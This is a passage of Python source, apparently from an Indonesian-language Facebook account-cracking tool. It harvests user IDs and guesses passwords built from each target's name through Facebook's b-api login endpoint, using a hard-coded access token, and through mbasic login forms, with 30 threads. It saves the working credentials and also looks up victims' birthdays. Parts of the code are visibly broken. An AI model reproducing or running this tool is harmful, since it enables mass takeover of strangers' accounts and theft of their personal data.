			id.append(__+"<=>"+str(_))
	except KeyError:
		exit(" ╠══[!] akun tidak tersedia atau error")
		print('%s \x1b[1;92m║'%(B))
	print(" ╠══[+] total id  : %s%s%s"%(M,len(id),N))
	fii_xd()
### CEK DATA² TARGET ###
def igg():
    jalan(' ╠══[*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
    print('%s \x1b[1;92m║'%(O))
    input(' ╠══[*] kembali ')
    menu()
####INFO TOOLS####
def info_tools():
    os.system('clear')
    jalan('%s╠══[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m');time.sleep(0.07)
    jalan('\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Yt       \x1b[1;93m: fikri sinaga.'%(N,H,N))
    jalan('\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Author   \x1b[1;93m: Fikri Syahputra Sinaga.'%(N,H,N))
    jalan('\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Github   \x1b[1;93m: https://github.com/Syafii-XD'%(N,H,N))
    jalan('\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Facebook \x1b[1;93m: fikri.sinaga'%(N,H,N));time.sleep(0.07)
    jalan('\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Link FB  \x1b[1;93m: https://www.facebook.com/fikri.sinaga'%(N,H,N))
    jalan('\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Team     \x1b[1;93m: SMK-TBL 2022'%(N,H,N))
    jalan('\n %s\x1b[1;92m╠══[%s>%s\x1b[1;92m] Catatan  \x1b[1;93m: Please support my github, brothers and sisters'%(N,H,N))
    print('%s \x1b[1;92m║'%(O))
    input(' ╠══[ %sKEMBALI%s ] '%(O,N))
    menu()
    
####LAPORAN BUG####
def laporbug():
    print('%s \x1b[1;92m║'%(O))
    asulo = raw_input(' \x1b[1;92m╠══[?] masukan laporan bug script : \x1b[1;92m').replace(' ', '%20')
    if asulo == '':
        menu()
    os.system('xdg-open https://wa.me/6282249067204?text=' + asulo)
    print('%s \x1b[1;92m║'%(O))
    raw_input(' \x1b[1;92m[*] \x1b[1;93mkembali ')
    menu()
    
#####LOGIN HASIL
def log_hasil(user, pasw):
    ua = "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print(f"{B} | ")
        jalan(f"\r{M}[!] Akun terkena spam")
    if "c_user" in ses.cookies:
        jalan(f"\r{P}[•]{I} Akun berhasil di login")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh}
        tempek = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in tempek.find_all("option")]
        for opt in range(len(ngew)):
            jalan(f"\r{U}[{B}{str(opt+1)}{U}]{P}--->{k}[{B}{ngew[opt]}{K}]")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        jalan(f"\r{P}[!]{M}>>>> {oh}")
    else:
        jalan(f"\r{P}[•]{M} Akun tersebut sandi nya telah di ganti")
        
def cek_hasil():
    print('%s║'%(B))
    print('%s║'%(B))
    print(f"{P}[•] Masukan file cp ")
    print(f"{P}[•] Contoh untuk masukan file : {B}CP/{tanggal}.json")
    print('%s║'%(B))
    files =input(f"{P}[•] Masukan nama file : {B}")
    try:
        buka_baju = open(files,"r").readlines()
    except FileNotFoundError:
        print('%s║'%(B))
        print('%s║'%(B))
        print(f"{P}[!]{M} File tidak di temukan");exit()
        time.sleep(2);ubahpw()
    print('%s║'%(B))
    print(f"{P}[•] Total akun chekpoint : {B}{str(len(buka_baju))}")
    print('%s║'%(B))
    print('%s║'%(B))
    for memek in buka_baju:
        kontol = memek.replace("\n","")
        titid  = kontol.split("|")
        print(f"{B} | ")
        print(f"{P}[•] Akun facebook : {B}{kontol}")
        try:
            log_hasil(titid[0], titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print('%s║'%(B))
    print('%s║'%(B))
    input(f"{P}[•]{I} Chek akun sudah selesai")
    menu()
    
def cek_results():
    try:
        open("OK/%s.txt"%(tanggal))
    except IOError:
        os.system("touch OK/%s.txt"%(tanggal))
    try:
        open("CP/%s.txt"%(tanggal))
    except IOError:
        os.system("touch CP/%s.txt"%(tanggal))
    cp=("CP/%s.txt"%(tanggal))
    ok=("OK/%s.txt"%(tanggal))
    hsl_cp=open(cp,"r").read()
    hsl_ok=open(ok,"r").read()
    print('%s║'%(B))
    print('%s║'%(B))
    print(f"{K}╠══[01] {P}Cek results cp")
    print(f"{K}╠══[02] {P}Cek results ok")
    print(f"{K}╠══[0] {P}Back")
    print(f"{B} | ")
    _pil3h=input(f"{K}╠══[•] {P}Pilih : {B}")
    if _pil3h in ["1","01"]:
        if len(hsl_cp) != 0:
            print(f"{B} | ")
            print(f"{K}╠══[•]{M} Results cp{B}")
            os.system("cat CP/%s.txt"%(tanggal))
        else:print(f"{K}╠══[•] Tidak ada hasil")
    elif _pil3h in ["2","02"]:
        if len(hsl_ok) != 0:
            print('%s║'%(B))
            print('%s║'%(B))
            print(f"{K}╠══[•]{I} Results ok")
            os.system("cat OK/%s.txt"%(tanggal))
        else:print(f"\n{P}[•]{M} Tidak ada hasil")
    elif _pil3h in ["0","00"]:
        menu()
    else:print(f"{P}[•]{M} Pilian tidak ada")

 ### pawrodd
def password(user):
    global fii_xd
    fii = []
    for i in range(0,10000000000000):fii.append(str(i))
    return fii
    try:
            ps, pp, na = fii_xd, fii_xd, user.split(" ")
            if len(na) < 2:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:fii.append(nd+"123");fii.append(nd+"12345")
                else:fii.append(nd);fii.append(nd+"123");fii.append(nd+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for i in pp.split(','):fii.append(nd+i)
            else:
                nd = na[0].lower()
                if len(nd)<3:pass
                elif len(nd)==3 or len(nd)==4 or len(nd)==5:fii.append(nd+"123");fii.append(nd+"12345")
                else:fii.append(nd);fii.append(nd+"123");fii.append(nd+"12345")
                nb = na[-1].lower()
                if len(nb)<3:pass
                elif len(nb)==3 or len(nb)==4 or len(nb)==5:fii.append(nb+"123");fii.append(nb+"12345")
                else:fii.append(nb);fii.append(nb+"123");fii.append(nb+"12345")
                if pp in ['',' ','  ']:pass
                else:
                    for i in pp.split(','):fii.append(nd+i);fii.append(nb+i)
            if ps in ['',' ','  ']:
                pass
            else:
                for z in ps.split(','):fii.append(z)
            fii.append(user.lower())
            return fii
    except:return fii


def fii_xd():
	print('%s║'%(B))
	kone()
	print('%s║'%(B))
	fiisayangwidiya =input(f"{K}╠══[•] {P}Pilih : {B}")
	if fiisayangwidiya in [""]:
		print('%s║'%(B))
		print(f"{K}╠══[•]{M} Pilihan tidak boleh kosong");exit()
	elif fiisayangwidiya in ["1","01"]:
		print(f"{K}╠══[•] {P}Tampilan kan opsi akun chek point {B}Y/t")
		jalan(f"{K}╠══[!]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print('%s║'%(B))
		_checkoptions_=input(f"{K}╠══[•] {P}Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "anjink"
				key = "anjink" #----- jangan di ubah
				if _key in key:
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Crack menggunakan password manual/default {B}M/D")
					print('%s║'%(B))
					ter =input(f"{K}╠══[•] {P}Input : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print('%s║'%(B))
							print('%s║'%(B))
							print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
							print('%s║'%(B))
							asu = print(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
							if len(asu) =="":
								print('%s║'%(B))
								print(f"{K}╠══[•]{M} Sandi tidak boleh kosong");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(api, uid, asu)
						exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(api, uid, fii)
						exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
				else:print(f"{K}╠══[•]{M} Eror");exit()
			except (KeyError,IOError):print(f"{P}[•]{M} Eror");exit()

		else:
			print('%s║'%(B))
			print(f"{K}╠══[•] {P}Crack menggunakan password manual/default {B}M/D")
			print('%s║'%(B))
			ter =input(f"{K}╠══[•] {P}Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
					print('%s║'%(B))
					asu = input(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
					if len(asu) =="":
						print('%s║'%(B))
						print('%s║'%(B))
						print(f"{K}╠══[!]{M} Sandi tidak boleh kosong")
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(api, uid, asu)
				exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]

						coeg.submit(apiiii, uid, fii)
				exit()

	elif fiisayangwidiya in ["3","03"]:
		print('%s║'%(B))
		print('%s║'%(B))
		print(f"{K}╠══[•] {P}Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{K}╠══[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print('%s║'%(B))
		_checkoptions_=input(f"{K}╠══[•] {P}Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Crack menggunakan password manual/default {B}M/D")
					print('%s║'%(B))
					ter =input(f"{K}╠══[•] {P}Pilih : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print('%s║'%(B))
							print('%s║'%(B))
							print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
							print('%s║'%(B))
							asu = input(f"{P}[•] Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print('%s║'%(B))
								print(f"{K}╠══[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mobil, uid, asu)
						exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mobill, uid, fii)
						exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print('%s║'%(B))
			print('%s║'%(B))
			print(f"{K}╠══[•] {P}Crack menggunakan pasword manual/defaults {B}M/D")
			print('%s║'%(B))
			ter =input(f"{K}╠══[•] {P}Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Contoh password {B}Anjink,kontol,sayang")
					print('%s║'%(B))
					asu = input(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
					if len(asu) =="":
						print('%s║'%(B))
						print('%s║'%(B))
						print(f"{K}╠══[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mobil, uid, asu)
				exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bissmilah", "anjing", "sayang", "sayangkamu" ]
						coeg.submit(mobill, uid, fii)
				exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
				
	elif fiisayangwidiya in ["2","02"]:
		print('%s║'%(B))
		print('%s║'%(B))
		print(f"{K}╠══[•] {P}Tampilkan opsi chekpoint {B}Y/T")
		jalan(f"{K}╠══[•]{M} Terkadang jika menampilkan opsi jarang dapet akun !!!")
		print('%s║'%(B))
		_checkoptions_=input(f"{K}╠══[•] {P}Pilih : {B}")
		if _checkoptions_ in ["y","Y"]:
			try:
				_key = "Anjink"
				key = "Anjink"
				if _key in key:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] Crack {P}menggunakan password manual/default {B}M/D")
					print('%s║'%(B))
					ter =input(f"{K}╠══[•] {P}Pilih : {B}")
					if ter in ["m","M"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							print('%s║'%(B))
							print('%s║'%(B))
							print(f"{K}╠══[•] {P}Contoh password : {B}sayang,anjing,kontol")
							print('%s║'%(B))
							asu = input(f"{K}╠══[•] {P}Buat sandi : {B} ").split(",")
							if len(asu) =="":
								print('%s║'%(B))
								print(f"{K}╠══[•]{M} Sandi tidak boleh kosong anjink");exit()
							started()
							for user in id:
								uid, name = user.split("<=>")
								coeg.submit(mbasic, uid, asu)
						exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
					elif ter in ["d","D"]:
						with ThreadPoolExecutor(max_workers=30) as coeg:
							started()
							for user in id:
								uid, name = user.split("<=>")
								frist=name.split(" ")
								if len(frist)>=6:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=2:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								elif len(frist)<=3:
									fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
								else:
									fii = [ "bissmilah", "anjing", "indonesia", "sayangkamu" ]
								coeg.submit(mbasic, uid, fii)
						exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
				else:print(f"{key}");exit()
			except (KeyError,IOError):print(f"{_key}");exit()

		else:
			print('%s║'%(B))
			print('%s║'%(B))
			print(f"{K}╠══[•] {P}Crack menggunakan pasword manual/defaults {B}M/D")
			print('%s║'%(B))
			ter =input(f"{K}╠══[•] {P}Pilih : {B}")
			if ter in ["m","M"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					print('%s║'%(B))
					print('%s║'%(B))
					print(f"{K}╠══[•] {P}Contoh password {B}Anjink,kontol,sayang")
					print('%s║'%(B))
					asu = input(f"{K}╠══[•] {P}Buat sandi : {B}").split(",")
					if len(asu) =="":
						print('%s║'%(B))
						print('%s║'%(B))
						print(f"{K}╠══[•]{M} Sandi tidak boleh kosong");exit()
					started()
					for user in id:
						uid, name = user.split("<=>")
						coeg.submit(mbasicc, uid, asu)
				exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
			elif ter in ["d","D"]:
				with ThreadPoolExecutor(max_workers=30) as coeg:
					started()
					for user in id:
						uid, name = user.split("<=>")
						frist=name.split(" ")
						if len(frist)>=6:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=2:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						elif len(frist)<=3:
							fii = [ name, frist[0], frist[0]+"1234", frist[0]+"12345", frist[0]+"123456" ]
						else:
							fii = [ "bismillah", "anjing", "sayang", "sayangkamu" ]
						coeg.submit(mbasicc, uid, fii)
				exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
				
def kone():
    print('%s║'%(B))
    print('%s║'%(B))
    print('%s╠══[%s1%s] %sB-Api %s<><><>%s Kencang'%(K,P,K,P,K,P))
    print('%s╠══[%s2%s] %smbasic %s<><><>%s Lambat'%(K,P,K,P,K,P))
    print('%s╠══[%s3%s] %sMobile %s<><><>%s SuperLambat'%(K,P,K,P,K,P))

def started():
    print('%s║'%(B))
    print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(K,P,K,P))
    print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(K,P,K,P,tanggal))
    print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(K,P,K,P,tanggal))
    print('%s╚══[%s•%s] %sAktifkan Mode Pesawat [5 Detik Saja] Setiap 5 Menit\n'%(K,P,K,P))
    print('%s║%s'%(B,P))

def api(uid, fii):
    try:
        ua = open('ugent.txt','r').read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie
    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open('token.txt','r').read()
                cookie = {'cookie':open('cookie.txt','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            cek_log(uid,pw,ua)
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def apiiii(uid, fii):
    try:
        ua = open('ugent.txt','r').read()
    except IOError:
        ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
    global ok, cp, loop, token, cookie

    sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
    for pw in fii:
        pw = pw.lower()
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        ses = requests.Session()
        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_inlololid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
        if "session_key" in send.text and "EAAA" in send.text:
            print(f"\r{B} |----> {I}{uid}•{pw}")
            ok.append("%s|%s"%(uid, pw))
            open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        elif "www.facebook.com" in send.json()["error_msg"]:
            try:
                token = open('token.txt','r').read()
                cookie = {'cookie':open('cookie.txt','r').read()}
                ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
                month, day, year = ttl.split("/")
                month = _bulan_[month]
                print(f"\r{B} |----> {K}{uid}•{pw}•{day} {mont} {year}")
                cp.append("%s|%s"%(uid, pw))
                open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                break
            except (KeyError, IOError):
                day = (" ")
                month = (" ")
                year = (" ")
            except:pass
            print(f"\r{B} |----> {K}{uid}•{pw}")
            cp.append("%s|%s"%(uid, pw))
            open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
            break
        else:
            continue

    loop += 1

def mbasic(uid, fii):
	try:
		ua = open('ugent.txt','r').read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print(f"\r{B} |----> {I}{uid}•{pw}•{kuki}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open('token.txt','r').read()
				cookie = {'cookie':open('cookie.txt','r').read()}
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print(f"\r{B} |----> {K}{uid}•{pw}•{day} {month} {year}")
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			cek_log(uid,pw,ua)
			print(f"\r{B} |----> {K}{uid}•{pw}")
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasicc(uid, fii):
	try:
		ua = open('ugent.txt','r').read()
	except IOError:
		ua = "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
	global ok, cp, loop, token, cookie
	sys.stdout.write(f"\r{P}[•] >>>>>> {B} {loop}/{len(id)} {I}OK : {B}{len(ok)} {K}CP : {B}{len(cp)}");sys.stdout.flush()
	for pw in fii:
		fii_gtg = {}
		pw = pw.lower()
		ses = requests.Session()
